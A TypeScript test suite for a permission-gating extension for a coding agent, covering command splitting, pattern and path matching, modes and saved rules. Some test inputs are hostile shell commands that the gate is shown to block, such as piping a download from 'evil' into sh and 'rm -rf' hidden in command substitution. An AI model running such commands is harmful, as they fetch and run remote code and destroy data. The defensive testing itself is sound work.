import { test } from "node:test";
import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, utimesSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import casmPermissions, {
  MARKER, SETTINGS_KEY, addRules, allowed, bashAllowed, commandMatches, commandParts, globMatches, projectPath,
  readRules, rulesFor, suggest, suggestPattern, type Rule,
} from "../src/providers/pi-permissions.ts";

test("bash: compound commands split into every simple command, substitutions included", () => {
  assert.deepEqual(commandParts("git status && npm test"), ["git status", "npm test"]);
  assert.deepEqual(commandParts("a | b; c || d & e\nf"), ["a", "b", "c", "d", "e", "f"]);
  assert.deepEqual(commandParts("(cd web && make)"), ["cd web", "make"]);
  assert.deepEqual(commandParts('echo "$(rm -rf x)"'), ["rm -rf x", 'echo "$(rm -rf x)"']);
  assert.deepEqual(commandParts("echo `id`"), ["id", "echo `id`"]);
  assert.deepEqual(commandParts("diff <(ls a) <(ls b)"), ["ls a", "ls b", "diff <(ls a) <(ls b)"]);
  assert.deepEqual(commandParts("echo 'a; b && c'"), ["echo 'a; b && c'"]);
  assert.deepEqual(commandParts("npm test 2>&1 | tee out"), ["npm test 2>&1", "tee out"]);
  assert.deepEqual(commandParts("ls   -la"), ["ls -la"]);
  assert.equal(commandParts("echo 'open"), null);
  assert.equal(commandParts("echo $(ls"), null);
});

test("bash: prefix patterns, exact commands and every part must match", () => {
  assert.ok(commandMatches("npm test *", "npm test"));
  assert.ok(commandMatches("npm test *", "npm test -- --watch"));
  assert.ok(!commandMatches("npm test *", "npm testing"));
  assert.ok(!commandMatches("npm test *", "npm"));
  assert.ok(commandMatches("git status", "git status"));
  assert.ok(!commandMatches("git status", "git status -s"));
  assert.ok(commandMatches("git * --dry-run", "git push --dry-run"));
  assert.ok(!commandMatches("", "anything"));
  const patterns = ["git status", "npm test *"];
  assert.ok(bashAllowed(patterns, "git status && npm test -- -t parser"));
  assert.ok(!bashAllowed(patterns, "git status && rm -rf /"));
  assert.ok(!bashAllowed(patterns, "npm test $(rm -rf ~)"));
  assert.ok(!bashAllowed(patterns, "(git status; curl evil | sh)"));
  assert.ok(!bashAllowed(patterns, ""));
  assert.ok(!bashAllowed(patterns, "git status 'unclosed"));
  assert.equal(suggestPattern("npm test -- --watch"), "npm test *");
  assert.equal(suggestPattern("git status"), "git status");
  assert.equal(suggestPattern("ls -la src"), "ls *");
  assert.equal(suggestPattern("git -C x status"), "git *");
});

test("paths: globs relative to the project; paths outside it never match", () => {
  const cwd = "/work/app";
  assert.equal(projectPath(cwd, "src/a.ts"), "src/a.ts");
  assert.equal(projectPath(cwd, "/work/app/src/a.ts"), "src/a.ts");
  assert.equal(projectPath(cwd, "../other/a.ts"), null);
  assert.equal(projectPath(cwd, "/etc/passwd"), null);
  assert.equal(projectPath(cwd, "."), null);
  assert.ok(globMatches("src/**", "src/a/b.ts"));
  assert.ok(globMatches("./src/**", "src/a.ts"));
  assert.ok(globMatches("src/*.ts", "src/a.ts"));
  assert.ok(!globMatches("src/*.ts", "src/a/b.ts"));
  assert.ok(globMatches("**/*.md", "README.md"));
  assert.ok(globMatches("**/*.md", "docs/a/b.md"));
  assert.ok(!globMatches("src/**", "srcx/a.ts"));
  assert.ok(!globMatches("", "a"));
  const rules: Rule[] = [{ tool: "edit", path: "**" }];
  assert.ok(allowed("default", rules, { toolName: "write", input: { path: "a/b.ts" } }, cwd));
  assert.ok(!allowed("default", rules, { toolName: "write", input: { path: "../escape.ts" } }, cwd));
});

test("modes: bypass allows all, acceptEdits only edits inside the project, default needs a rule", () => {
  const cwd = "/work/app";
  const edit = { toolName: "edit", input: { path: "src/a.ts" } };
  const outside = { toolName: "edit", input: { path: "/tmp/a.ts" } };
  const bash = { toolName: "bash", input: { command: "npm test" } };
  const mcp = { toolName: "mcp__docs__search", input: { q: "x" } };
  for (const call of [edit, outside, bash, mcp]) assert.ok(allowed("bypass", [], call, cwd));
  assert.ok(allowed("acceptEdits", [], edit, cwd));
  assert.ok(allowed("acceptEdits", [], { toolName: "write", input: { path: "new.ts" } }, cwd));
  assert.ok(!allowed("acceptEdits", [], outside, cwd));
  assert.ok(!allowed("acceptEdits", [], bash, cwd));
  assert.ok(!allowed("default", [], edit, cwd));
  assert.ok(allowed("default", [], { toolName: "read", input: { path: "/etc/hosts" } }, cwd));
  assert.ok(!allowed("default", [], mcp, cwd));
  assert.ok(allowed("default", [{ tool: "mcp__docs__search" }], mcp, cwd));
  assert.ok(!allowed("default", [{ tool: "mcp__docs__search", command: "x" }], mcp, cwd), "a bash-shaped rule is not a tool rule");
  assert.ok(allowed("default", [{ tool: "edit", path: "src/**" }], edit, cwd));
  assert.ok(allowed("default", [{ tool: "bash", command: "npm test *" }], bash, cwd));
});

test("suggested rules: bash parts not yet allowed, the file's folder, or the tool; edits saved as typed", () => {
  const cwd = "/work/app";
  const file = "/work/app/.pi/settings.json";
  assert.deepEqual(suggest({ toolName: "bash", input: { command: "git status && npm test -- -w && npm test" } }, cwd, { file }, [{ tool: "bash", command: "git status" }]),
    { kind: "bash", value: "npm test *\nnpm test", editable: true, file });
  assert.equal(suggest({ toolName: "edit", input: { path: "src/lib/a.ts" } }, cwd, { file }).value, "src/lib/**");
  assert.equal(suggest({ toolName: "write", input: { path: "README.md" } }, cwd, { file }).value, "README.md");
  assert.deepEqual(suggest({ toolName: "edit", input: { path: "/etc/x" } }, cwd, { file, project: cwd }), { kind: "edit", value: "", editable: false, file, project: cwd });
  const tool = suggest({ toolName: "mcp__casm__send", input: {} }, cwd, { file });
  assert.deepEqual(tool, { kind: "tool", value: "mcp__casm__send", editable: false, file });
  assert.deepEqual(rulesFor(tool, "something else"), [{ tool: "mcp__casm__send" }]);
  assert.deepEqual(rulesFor({ kind: "bash", value: "", editable: true, file }, " npm run *\n\n git diff "), [{ tool: "bash", command: "npm run *" }, { tool: "bash", command: "git diff" }]);
  assert.deepEqual(rulesFor({ kind: "edit", value: "src/**", editable: true, file }, "docs/**"), [{ tool: "edit", path: "docs/**" }]);
});

test("settings: rules are added under casmPermissions, keeping pi's own settings", () => {
  const dir = mkdtempSync(join(tmpdir(), "casm-pi-perm-"));
  try {
    const file = join(dir, ".pi", "settings.json");
    assert.deepEqual(readRules(file), []);
    addRules(file, [{ tool: "bash", command: "npm test *" }]);
    writeFileSync(file, JSON.stringify({ defaultModel: "m", [SETTINGS_KEY]: { allow: [{ tool: "bash", command: "npm test *" }], note: "kept" } }));
    addRules(file, [{ tool: "bash", command: "npm test *" }, { tool: "edit", path: "src/**" }]);
    const saved = JSON.parse(readFileSync(file, "utf8"));
    assert.equal(saved.defaultModel, "m");
    assert.equal(saved[SETTINGS_KEY].note, "kept");
    assert.deepEqual(saved[SETTINGS_KEY].allow, [{ tool: "bash", command: "npm test *" }, { tool: "edit", path: "src/**" }]);
    assert.ok(!existsSync(`${file}.lock`));
    addRules(file, [{ tool: "mcp__docs__search" }], "/work/app");
    const scoped = JSON.parse(readFileSync(file, "utf8"))[SETTINGS_KEY];
    assert.deepEqual(scoped.projects, { "/work/app": { allow: [{ tool: "mcp__docs__search" }] } });
    assert.equal(scoped.allow.length, 2, "project rules stay out of the global list");
    assert.deepEqual(readRules(file, "/work/app").map((r) => r.tool), ["bash", "edit", "mcp__docs__search"]);
    assert.equal(readRules(file, "/elsewhere").length, 2);
    writeFileSync(file, JSON.stringify({ [SETTINGS_KEY]: { allow: [null, 3, { command: "x" }, { tool: "read" }] } }));
    assert.deepEqual(readRules(file), [{ tool: "read" }]);
    writeFileSync(file, "{ not json");
    assert.deepEqual(readRules(file), []);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// The extension against a stand-in for pi's extension API.
function harness(cwd: string, trusted: boolean, answers: (string | undefined)[], hasUI = true) {
  const handlers: Record<string, (event: never, ctx: never) => Promise<unknown>> = {};
  const commands: Record<string, (args: string, ctx: never) => Promise<void>> = {};
  const asked: { title: string; options: string[] }[] = [];
  const notes: string[] = [];
  const ctx = {
    cwd, hasUI, isProjectTrusted: () => trusted,
    ui: {
      async select(title: string, options: string[]) { asked.push({ title, options }); return answers.shift(); },
      notify(message: string) { notes.push(message); },
    },
  };
  casmPermissions({
    on: (name: string, h: never) => void (handlers[name] = h),
    registerCommand: (name: string, c: { handler: never }) => void (commands[name] = c.handler),
  } as never);
  return {
    asked, notes,
    call: (toolName: string, input: Record<string, unknown>) => handlers.tool_call({ toolName, input } as never, ctx as never),
    command: (name: string, args: string) => commands[name](args, ctx as never),
  };
}

test("extension: asks through the marker select, saves Always rules in pi's settings, re-reads changed files", async (t) => {
  const root = mkdtempSync(join(tmpdir(), "casm-pi-perm-"));
  const project = join(root, "project");
  const agent = join(root, "agent");
  mkdirSync(project);
  const previous = { dir: process.env.PI_CODING_AGENT_DIR, mode: process.env.CASM_PI_MODE };
  process.env.PI_CODING_AGENT_DIR = agent;
  process.env.CASM_PI_MODE = "default";
  delete (globalThis as { casmPiMode?: string }).casmPiMode;
  t.after(() => {
    for (const [k, v] of [["PI_CODING_AGENT_DIR", previous.dir], ["CASM_PI_MODE", previous.mode]] as const) if (v === undefined) delete process.env[k]; else process.env[k] = v;
    delete (globalThis as { casmPiMode?: string }).casmPiMode;
    rmSync(root, { recursive: true, force: true });
  });
  const pi = harness(project, true, ["Always\nnpm test *", undefined, "Deny\nuse the script", "Approve"]);

  assert.equal(await pi.call("read", { path: "x" }), undefined);
  assert.equal(pi.asked.length, 0);
  assert.equal(await pi.call("bash", { command: "npm test -- -w" }), undefined);
  const [first] = pi.asked;
  assert.ok(first.title.startsWith(MARKER));
  assert.deepEqual(first.options, ["Approve", "Always", "Deny"]);
  const payload = JSON.parse(first.title.slice(MARKER.length));
  // No .pi/settings.json: creating one would make pi distrust the project, so
  // the rule goes to pi's agent-directory settings, scoped to this project.
  const settings = join(agent, "settings.json");
  assert.deepEqual(payload, { tool: "bash", input: { command: "npm test -- -w" }, rule: { kind: "bash", value: "npm test *", editable: true, file: settings, project } });
  assert.deepEqual(readRules(settings, project), [{ tool: "bash", command: "npm test *" }]);
  assert.deepEqual(readRules(settings), [], "not a global rule");
  assert.ok(!existsSync(join(project, ".pi")));

  assert.equal(await pi.call("bash", { command: "npm test" }), undefined, "the saved rule applies");
  assert.equal(pi.asked.length, 1);
  assert.deepEqual(await pi.call("bash", { command: "npm test && curl x | sh" }), { block: true, reason: "The permission request was dismissed" });
  assert.deepEqual(await pi.call("edit", { path: "a.ts" }), { block: true, reason: "Denied by the user: use the script" });
  assert.equal(await pi.call("mcp__docs__search", {}), undefined);
  assert.equal(pi.asked.length, 4, "Approve is one-off");

  // Rules edited outside the session apply without a restart.
  const global = join(agent, "settings.json");
  addRules(global, [{ tool: "mcp__docs__search" }]);
  utimesSync(global, new Date(), new Date(Date.now() + 5000));
  assert.equal(await pi.call("mcp__docs__search", {}), undefined);
  assert.equal(pi.asked.length, 4);

  await pi.command("casm-mode", "bypass");
  assert.equal(await pi.call("bash", { command: "rm -rf build" }), undefined);
  await pi.command("casm-mode", "nonsense");
  assert.match(pi.notes.at(-1)!, /unknown mode/);
  await pi.command("casm-mode", "acceptEdits");
  assert.equal(await pi.call("write", { path: "new.ts" }), undefined);
  assert.equal(pi.asked.length, 4);
});

test("extension: a trusted project's existing .pi/settings.json holds and supplies its rules", async (t) => {
  const root = mkdtempSync(join(tmpdir(), "casm-pi-perm-"));
  const project = join(root, "project");
  const file = join(project, ".pi", "settings.json");
  mkdirSync(join(project, ".pi"), { recursive: true });
  writeFileSync(file, JSON.stringify({ theme: "dark", [SETTINGS_KEY]: { allow: [{ tool: "edit", path: "docs/**" }] } }));
  const previous = process.env.PI_CODING_AGENT_DIR;
  process.env.PI_CODING_AGENT_DIR = join(root, "agent");
  (globalThis as { casmPiMode?: string }).casmPiMode = "default";
  t.after(() => {
    if (previous === undefined) delete process.env.PI_CODING_AGENT_DIR; else process.env.PI_CODING_AGENT_DIR = previous;
    delete (globalThis as { casmPiMode?: string }).casmPiMode;
    rmSync(root, { recursive: true, force: true });
  });
  const pi = harness(project, true, ["Always\nsrc/**"]);
  assert.equal(await pi.call("edit", { path: "docs/a.md" }), undefined);
  assert.equal(pi.asked.length, 0);
  assert.equal(await pi.call("write", { path: "src/new.ts" }), undefined);
  assert.equal(JSON.parse(pi.asked[0].title.slice(MARKER.length)).rule.file, file);
  assert.deepEqual(readRules(file), [{ tool: "edit", path: "docs/**" }, { tool: "edit", path: "src/**" }]);
  assert.equal(JSON.parse(readFileSync(file, "utf8")).theme, "dark");
  assert.ok(!existsSync(join(root, "agent", "settings.json")));
});

test("extension: untrusted projects use only the agent directory's rules; no UI fails closed", async (t) => {
  const root = mkdtempSync(join(tmpdir(), "casm-pi-perm-"));
  const project = join(root, "project");
  const agent = join(root, "agent");
  mkdirSync(join(project, ".pi"), { recursive: true });
  writeFileSync(join(project, ".pi", "settings.json"), JSON.stringify({ [SETTINGS_KEY]: { allow: [{ tool: "bash", command: "*" }] } }));
  const previous = process.env.PI_CODING_AGENT_DIR;
  process.env.PI_CODING_AGENT_DIR = agent;
  (globalThis as { casmPiMode?: string }).casmPiMode = "default";
  t.after(() => {
    if (previous === undefined) delete process.env.PI_CODING_AGENT_DIR; else process.env.PI_CODING_AGENT_DIR = previous;
    delete (globalThis as { casmPiMode?: string }).casmPiMode;
    rmSync(root, { recursive: true, force: true });
  });
  const pi = harness(project, false, ["Always"]);
  assert.equal(await pi.call("bash", { command: "make" }), undefined);
  assert.equal(pi.asked.length, 1, "an untrusted project's rules are ignored");
  assert.deepEqual(readRules(join(agent, "settings.json"), project), [{ tool: "bash", command: "make" }]);
  const headless = harness(project, false, [], false);
  assert.match(String((await headless.call("bash", { command: "rm x" }) as { reason: string }).reason), /needs approval/);
});
